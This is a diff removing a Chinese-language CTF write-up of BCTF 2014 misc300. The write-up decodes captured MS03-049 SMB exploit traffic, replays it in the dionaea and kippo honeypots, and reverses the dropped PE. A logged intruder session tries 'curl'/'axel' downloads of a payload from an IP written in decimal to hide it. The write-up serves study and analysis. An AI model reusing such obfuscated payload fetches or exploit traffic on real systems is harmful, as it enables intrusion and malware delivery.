-</span><span class='line'><span class="p">(</span><span class="s">&#39;out&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x00</span><span class="s">U</span><span class="se">\xff</span><span class="s">SMBr</span><span class="se">\x00\x00\x00\x00\x98\x01</span><span class="s">(</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18</span><span class="s">n</span><span class="se">\x11\x03\x00\x03\x01\x00\x01\x00\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xfd\xe3\x00\x80\xb3\x13</span><span class="s">&quot;</span><span class="se">\xd7</span><span class="s">L#</span><span class="se">\xcf\x01\xc4\xff\x00\x10\x00\x0b\xff</span><span class="s">e8T~lB</span><span class="se">\xa4</span><span class="s">&gt;</span><span class="se">\x12\xd2\x11\x97\x16</span><span class="s">D&#39;</span><span class="p">),</span>
-</span><span class='line'><span class="p">(</span><span class="s">&#39;in&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x00\xb1\xff</span><span class="s">SMBs</span><span class="se">\x00\x00\x00\x00\x18\x01</span><span class="s">(</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18</span><span class="s">n</span><span class="se">\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00</span><span class="s">S</span><span class="se">\x00\x00\x00\x00\x00\xd4\x00\x00\x80</span><span class="s">v</span><span class="se">\x00</span><span class="s">`Q</span><span class="se">\x06\x06</span><span class="s">+</span><span class="se">\x06\x01\x05\x05\x02\xa0</span><span class="s">G0E</span><span class="se">\xa0\x0e</span><span class="s">0</span><span class="se">\x0c\x06\x0a</span><span class="s">+</span><span class="se">\x06\x01\x04\x01\x82</span><span class="s">7</span><span class="se">\x02\x02\x0a\xa2</span><span class="s">3</span><span class="se">\x04</span><span class="s">1NTLMSSP</span><span class="se">\x00\x01\x00\x00\x00\x05\x02\x88\xa2\x01\x00\x01\x00</span><span class="s"> </span><span class="se">\x00\x00\x00\x10\x00\x10\x00</span><span class="s">!</span><span class="se">\x00\x00\x00</span><span class="s">.AYplsysIiHy9uvbXWindows 2000 2195</span><span class="se">\x00</span><span class="s">Windows 2000 5.0</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">),</span>
-</span><span class='line'><span class="p">(</span><span class="s">&#39;out&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x00\xad\xff</span><span class="s">SMBs</span><span class="se">\x16\x00\x00\xc0\x98\x01</span><span class="s">(</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x86\xe8\x00\x00\x18</span><span class="s">n</span><span class="se">\x04\xff\x00\x00\x00\x00\x00</span><span class="s">S</span><span class="se">\x00\x82\x00\xa1</span><span class="s">Q0O</span><span class="se">\xa0\x03\x0a\x01\x01\xa1\x0c\x06\x0a</span><span class="s">+</span><span class="se">\x06\x01\x04\x01\x82</span><span class="s">7</span><span class="se">\x02\x02\x0a\xa2</span><span class="s">:</span><span class="se">\x04</span><span class="s">8NTLMSSP</span><span class="se">\x00\x02\x00\x00\x00\x00\x00\x00\x00</span><span class="s">0</span><span class="se">\x00\x00\x00\x05\x02\x88\xa2\xa4\xdf\xe8\x0b\xf5\xc6\x1e</span><span class="s">:</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">0</span><span class="se">\x00\x00\x00\x05\x01</span><span class="s">(</span><span class="se">\x0a\x00\x00\x00\x0f</span><span class="s">Windows 5.1</span><span class="se">\x00</span><span class="s">Windows 2000 LAN Manager</span><span class="se">\x00</span><span class="s">WORKGROUP</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">),</span>
-</span><span class='line'><span class="p">(</span><span class="s">&#39;in&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x00\x00\x01</span><span class="s">_</span><span class="se">\xff</span><span class="s">SMBs</span><span class="se">\x00\x00\x00\x00\x18\x01</span><span class="s">(</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x86\xe8\x00\x00\x18</span><span class="s">n</span><span class="se">\x0c\xff\x00\x00\x00\xdf\xff\x02\x00\x01\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x5c\xd0\x00\x80</span><span class="s">$</span><span class="se">\x01\xa1\x81\xfe</span><span class="s">0</span><span class="se">\x81\xfb\xa2\x81\xf8\x04\x81\xf5</span><span class="s">NTLMSSP</span><span class="se">\x00\x03\x00\x00\x00\x18\x00\x18\x00</span><span class="s">@</span><span class="se">\x00\x00\x00</span><span class="s">z</span><span class="se">\x00</span><span class="s">z</span><span class="se">\x00</span><span class="s">X</span><span class="se">\x00\x00\x00\x02\x00\x02\x00\xd2\x00\x00\x00\x00\x00\x00\x00\xd4\x00\x00\x00</span><span class="s"> </span><span class="se">\x00</span><span class="s"> </span><span class="se">\x00\xd4\x00\x00\x00\x00\x00\x00\x00\xf4\x00\x00\x00\x05\x02\x88\xa2</span><span class="s">L</span><span class="se">\xc8\x1d\xb4</span><span class="s">s</span><span class="se">\xfa\xb4</span><span class="s">M</span><span class="se">\xc0\xa5</span><span class="s">F</span><span class="se">\xad\xb8\x16\x81\x89\xda\x87\x7f\x90</span><span class="s">3</span><span class="se">\xd6</span><span class="s">hd</span><span class="se">\x0a</span><span class="s">S%4J</span><span class="se">\x08\xfa\x82</span><span class="s">E~</span><span class="se">\xc8</span><span class="s">R</span><span class="se">\xf3</span><span class="s">SW</span><span class="se">\xa3\x01\x01\x00\x00\x00\x00\x00\x00\x00</span><span class="s">m&quot;y</span><span class="se">\xef\x27\xcf\x01\xda\x87\x7f\x90</span><span class="s">3</span><span class="se">\xd6</span><span class="s">hd</span><span class="se">\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\x07\x00\x08\x00\x00</span><span class="s">m&quot;y</span><span class="se">\xef\x27\xcf\x01\x09\x00</span><span class="s">&amp;</span><span class="se">\x00</span><span class="s">c</span><span class="se">\x00</span><span class="s">i</span><span class="se">\x00</span><span class="s">f</span><span class="se">\x00</span><span class="s">s</span><span class="se">\x00</span><span class="s">/</span><span class="se">\x00</span><span class="s">2</span><span class="se">\x00</span><span class="s">1</span><span class="se">\x00</span><span class="s">1</span><span class="se">\x00</span><span class="s">.</span><span class="se">\x00</span><span class="s">6</span><span class="se">\x00</span><span class="s">5</span><span class="se">\x00</span><span class="s">.</span><span class="se">\x00</span><span class="s">1</span><span class="se">\x00</span><span class="s">9</span><span class="se">\x00</span><span class="s">3</span><span class="se">\x00</span><span class="s">.</span><span class="se">\x00</span><span class="s">2</span><span class="se">\x00</span><span class="s">4</span><span class="se">\x00</span><span class="s">8</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">.</span><span class="se">\x00</span><span class="s">A</span><span class="se">\x00</span><span class="s">Y</span><span class="se">\x00</span><span class="s">p</span><span class="se">\x00</span><span class="s">l</span><span class="se">\x00</span><span class="s">s</span><span class="se">\x00</span><span class="s">y</span><span class="se">\x00</span><span class="s">s</span><span class="se">\x00</span><span class="s">I</span><span class="se">\x00</span><span class="s">i</span><span class="se">\x00</span><span class="s">H</span><span class="se">\x00</span><span class="s">y</span><span class="se">\x00</span><span class="s">9</span><span class="se">\x00</span><span class="s">u</span><span class="se">\x00</span><span class="s">v</span><span class="se">\x00</span><span class="s">b</span><span class="se">\x00</span><span class="s">X</span><span class="se">\x00\x00</span><span class="s">Windows 2000 2195</span><span class="se">\x00</span><span class="s">Windows 2000 5.0</span><span class="se">\x00</span><span class="s">&#39;</span><span class="p">),</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>每行都有SMB很明顯了, 翻翻 SMB header 定義</p>
-
-<p><a href="http://msdn.microsoft.com/en-us/library/ee441774.aspx">http://msdn.microsoft.com/en-us/library/ee441774.aspx</a></p>
-
-<p>Protocol (4 bytes): This field MUST contain the 4-byte literal string &lsquo;\xFF&rsquo;, &rsquo;S&#8217;, &rsquo;M&#8217;, &lsquo;B&rsquo;, with the letters represented by their respective ASCII values in the order shown. In the earliest available SMB documentation, this field is defined as a one byte message type (0xFF) followed by a three byte server type identifier.</p>
-
-<p>前面好像還包一層, 但不重要, 重要的是沒有前兩層的header  wireshark打不開</p>
-
-<p>剩下兩條路走.</p>
-
-<ol>
-<li><p>自己parse smb protocol 或找現成的parser</p></li>
-<li><p>包前兩層讓wireshark看得懂</p></li>
-</ol>
-
-
-<p>1.找不到現成的parser, 自己parse有點懶</p>
-
-<p>後來看到wireshark 有個tool是 text2pcap可以幫忙補上L2, L3的header</p>
-
-<p>但是在這邊卡了一段時間,因text2pcap一直沒有如預期的把內容塞進去</p>
-
-<p>man裡面明明說</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Here</span> <span class="ow">is</span> <span class="n">a</span> <span class="n">sample</span> <span class="n">dump</span> <span class="n">that</span>
-</span><span class='line'>       <span class="n">text2pcap</span> <span class="n">can</span> <span class="n">recognize</span><span class="p">:</span>
-</span><span class='line'>
-</span><span class='line'>           <span class="mo">000000</span> <span class="mo">00</span> <span class="n">e0</span> <span class="mi">1</span><span class="n">e</span> <span class="n">a7</span> <span class="mo">05</span> <span class="mi">6</span><span class="n">f</span> <span class="mo">00</span> <span class="mi">10</span> <span class="o">........</span>
-</span><span class='line'>           <span class="mo">00000</span><span class="mi">8</span> <span class="mi">5</span><span class="n">a</span> <span class="n">a0</span> <span class="n">b9</span> <span class="mi">12</span> <span class="mi">08</span> <span class="mo">00</span> <span class="mi">46</span> <span class="mo">00</span> <span class="o">........</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>結果他不認得,只會噴1 potential packet wrote 0 packet.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">Input from: demo</span>
-</span><span class='line'><span class="go">Output to: demo.pcap</span>
-</span><span class='line'><span class="go">Output format: PCAP</span>
-</span><span class='line'><span class="go">Generate dummy Ethernet header: Protocol: 0x800</span>
-</span><span class='line'><span class="go">Generate dummy IP header: Protocol: 6</span>
-</span><span class='line'><span class="go">Generate dummy TCP header: Source port: 139. Dest port: 139</span>
-</span><span class='line'><span class="go">Read 1 potential packet, wrote 0 packets (24 bytes).</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>最後發現他其實只能吃 #od -Ax -tx1 -v &ndash; 噴出來的格式</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span>od -Ax -tx1 -v -
-</span><span class='line'><span class="go">0000000    30  30  30  30  30  30  30  3a  20  35  63  37  38  20  33  34</span>
-</span><span class='line'><span class="go">0000010    33  33  20  35  63  37  38  20  33  32  33  31  20  35  63  37</span>
-</span><span class='line'><span class="go">0000020    38  20  33  30  33  31  20  35  63  37  38  20  33  30  33  30</span>
-</span><span class='line'><span class="go">0000030    20  20  5c  78  34  33  5c  78  32  31  5c  78  30  31  5c  78</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>確定能偽造header後 用以下command把parse過的檔案轉成pcap</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">od -Ax -tx1 -v input | text2pcap -T 139,139 - packet.pcap </span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p><img src="/images/writeup/bctf2014_misc300_pcap.PNG"></p>
-
-<p>看到\BROWSER 又有叫 NetrAddAlternateComputerName</p>
-
-<p>google一下就會發現是 MS03-049</p>
-
-<p>其實在這邊我只要去把那段shellcode解出來應該就差不多了</p>
-
-<p>但找不到tool解 當時也沒想到直接在windows寫程式run他&hellip;已經不會在windows上寫程式了XD</p>
-
-<p>回頭看提示發現跟honeypot有關</p>
-
-<p>再看看檔名 <strong>dionaea</strong> ..What the fuck</p>
-
-<h1>dionaea 是一個honeypot project</h1>
-
-<p>安裝太麻煩了,直接抓honeydrive下來,再參考這篇</p>
-
-<p><a href="http://blog.moep.name/index.php?/archives/2-Detecting-malware-with-dionaea.html">http://blog.moep.name/index.php?/archives/2-Detecting-malware-with-dionaea.html</a></p>
-
-<p>replay就可以重現當時的流量,dionaea還幫你分析好是MS03-049</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">1599</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">34</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">2167</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">3107</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">36</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">36</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">3597</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">37</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">37</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">3678</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">4024</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">4024</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="n">rpcservices</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">rpcservices</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">76</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">Calling</span> <span class="n">WKSSVC</span> <span class="n">NetAddAlternateComputerName</span> <span class="p">(</span><span class="mi">1</span><span class="n">b</span><span class="p">)</span> <span class="n">maybe</span> <span class="n">MS03</span><span class="o">-</span><span class="mi">39</span> <span class="n">exploit</span><span class="err">?</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">405</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">got</span> <span class="n">header</span>
-</span><span class='line'><span class="p">[</span><span class="mi">08032014</span> <span class="mi">18</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="n">SMB</span> <span class="n">dionaea</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">407</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> <span class="n">FragLen</span> <span class="mi">2124</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">buf</span><span class="p">)</span> <span class="mi">722</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>但大概是太久沒人解出來,主辦單位直接把難度降低 放出kippo.ttylog</p>
-
-<p>honeydrive上也有kippo</p>
-
-<p>用他的playlog.py replay 可以看到以下結果</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">nas3:/#</span> <span class="nb">cd </span>tmp/
-</span><span class='line'><span class="gp">nas3:/tmp#</span> ls
-</span><span class='line'><span class="gp">nas3:/tmp#</span> touch 1.sh
-</span><span class='line'><span class="gp">nas3:/tmp#</span> ls
-</span><span class='line'><span class="go">1.sh </span>
-</span><span class='line'><span class="gp">nas3:/tmp#</span> axel 2792326331/fool
-</span><span class='line'><span class="go">bash: axel: command not found</span>
-</span><span class='line'><span class="gp">nas3:/tmp#</span> curl 2792326331/fool
-</span><span class='line'><span class="go">bash: curl: command not found</span>
-</span><span class='line'><span class="gp">nas3:/tmp#</span> uname -r
-</span><span class='line'><span class="go">Linux</span>
-</span><span class='line'><span class="gp">nas3:/tmp#</span> rm 1.sh
-</span><span class='line'><span class="gp">nas3:/tmp#</span> <span class="nb">exit</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>這裡有個有趣的地方, 2792326331/fool</p>
-
-<p>大家都知道網址前面是 hostname 或是 IP</p>
-
-<p>但IP還可以用八進位或是16進位表示</p>
-
-<p>詳見 : <a href="http://drops.wooyun.org/papers/146">http://drops.wooyun.org/papers/146</a></p>
-
-<p>所以 2792326331/fool  其實是個網址</p>
-
-<p>抓下來是隻PE, 直接執行沒有看到寫registry或是寫檔的行為</p>
-
-<p>Reverse過程沒什麼特別的 就沒有截圖了..</p>
-
-<p>從IDA pro看有一段像是要寫registry,</p>
-
-<p>用ollydbg打開 把anti-debugging填成0x90</p>
-
-<p>就會發現該程式還會檢查參數還是什麼的,總之跳過之後</p>
-
-<p>他就會把key寫進registry裡面</p>
-
-<p><em>可惜這次重感冒+隔天要上班, 臨時打也找不到人 只有學弟陪我玩QQ</em></p>
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/blog/2014/03/14/bctf-misc300-write-up/">Read on &rarr;</a>
+    </footer>
   
 
 
